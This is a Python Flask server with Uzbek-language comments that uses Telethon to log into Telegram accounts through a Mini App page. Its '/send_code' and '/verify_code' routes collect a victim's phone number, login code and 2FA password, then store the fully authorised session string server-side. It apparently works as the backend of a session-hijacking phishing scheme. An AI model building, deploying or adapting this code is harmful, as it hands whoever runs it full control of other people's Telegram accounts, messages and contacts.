# =====================
# IMPORTS
# =====================
import os
import asyncio
from flask import Flask, request, jsonify, render_template
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    FloodWaitError
)

from database import (
    get_db,
    init_db,
    save_temp_session, get_temp_session, delete_temp_session,
    save_login_code, get_login_code, delete_login_code,
    save_session
)

# =====================
# CONFIG
# =====================
API_HASH = os.getenv("API_HASH")
API_ID_RAW = os.getenv("API_ID")
API_ID = int(API_ID_RAW) if API_ID_RAW else None

# =====================
# FLASK APP — SHART!
# =====================
app = Flask(__name__, template_folder="templates")

# =====================
# INIT DB (FAQAT AGAR KERAK BO‘LSA)
# =====================
if os.getenv("RUN_INIT_DB") == "1":
    init_db()

# =====================
# ASYNC HELPER
# =====================
def run_async(coro):
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = None

    if loop and loop.is_running():
        return asyncio.ensure_future(coro)
    else:
        return asyncio.run(coro)

# =====================
# ROUTES
# =====================
@app.route("/")
def index():
    return "LOGIN SERVER WORKING"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")


def run_async(coro):
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = None

    if loop and loop.is_running():
        return asyncio.ensure_future(coro)
    else:
        return asyncio.run(coro)
        


@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")
    if not phone:
        return jsonify({"status": "error", "message": "Telefon raqam yo‘q"}), 400

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            sent = await client.send_code_request(phone)
            session_string = client.session.save()
            # 🔐 TEMP SESSION + CODE SAQLAYMIZ
            save_temp_session(phone, session_string)
            return sent.phone_code_hash
        finally:
            await client.disconnect()

    try:
        phone_code_hash = run_async(_send())
        save_login_code(phone, phone_code_hash)
        return jsonify({"status": "ok"}), 200

    except FloodWaitError as e:
        return jsonify({
            "status": "error",
            "message": f"{e.seconds} soniya kuting, Telegram blok qo‘ydi"
        }), 429

    except Exception as e:
        print("SEND_CODE ERROR:", repr(e))
        return jsonify({"status": "error", "message": str(e)}), 500




@app.route("/verify_code", methods=["POST"])
def verify_code():
    phone = request.json.get("phone")
    code = request.json.get("code")
    password = request.json.get("password")  # 2FA bo‘lsa

    if not phone or not code:
        return jsonify({"status": "error", "message": "Ma’lumot yetarli emas"}), 400

    phone_code_hash = get_login_code(phone)
    session_string = get_temp_session(phone)

    if not phone_code_hash or not session_string:
        return jsonify({
            "status": "error",
            "message": "Sessiya eskirgan. Qayta kod so‘rang."
        }), 400

    async def _verify():
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        try:
            try:
                await client.sign_in(
                    phone=phone,
                    code=code,
                    phone_code_hash=phone_code_hash
                )
            except SessionPasswordNeededError:
                if not password:
                    return ("2fa_required", None)
                await client.sign_in(password=password)

            user = await client.get_me()
            final_session = client.session.save()
            return (user.id, final_session)
        finally:
            await client.disconnect()

    try:
        result = run_async(_verify())
        if result[0] == "2fa_required":
            return jsonify({"status": "2fa_required"})

        user_id, final_session = result
        # 💾 YAKUNIY SESSION
        save_session(user_id, final_session)
        # 🧹 TEMP MA’LUMOTLARNI O‘CHIRAMIZ
        delete_login_code(phone)
        delete_temp_session(phone)

        return jsonify({"status": "ok"}), 200

    except PhoneCodeInvalidError:
        return jsonify({"status": "error", "message": "Kod noto‘g‘ri"}), 400

    except Exception as e:
        print("VERIFY_CODE ERROR:", repr(e))
        return jsonify({"status": "error", "message": "Server xatosi"}), 500



# =====================
# RUN
# =====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
